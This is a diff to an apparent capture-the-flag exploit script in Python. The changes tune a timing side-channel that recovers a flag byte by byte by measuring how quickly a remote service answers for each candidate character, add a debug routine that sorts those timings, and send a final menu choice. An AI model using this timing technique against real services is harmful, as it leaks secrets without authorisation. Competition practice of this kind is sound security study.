@@ -6,7 +6,7 @@ from tqdm import tqdm
 import disassembler as d
 
 #context.log_level = 'debug'
-debug = True
+debug = False
 
 sample_flag = 'bob{s@mplflag}'
 
@@ -31,8 +31,29 @@ def cache_attack():
         s.recvuntil('[Register Info]')
         end = time()
 
-        if end-start < 0.02:
+        if end-start < 0.01:
             return i
+
+
+def cache_attack_debug():
+
+    li = []
+
+    for i in range(0x20, 0x80):
+        s.recvuntil('[Register Info]')
+        start = time()
+        s.recvuntil('[Register Info]')
+        end = time()
+
+        li.append((i, end-start))
+
+    li.sort(key=lambda x:x[1])
+    
+    print(li)
+    return li[0][0]
+    # for t in li:
+    #     if t[1] > 0.0001:
+    #         return t[0]
 
 def exploit():
 
@@ -61,6 +82,8 @@ def exploit():
         
         flag += chr(cache_attack() ^ 0x01)
         print flag
+    
+    s.sendlineafter('> ', '3')
 
 if __name__ == '__main__':
     if debug:
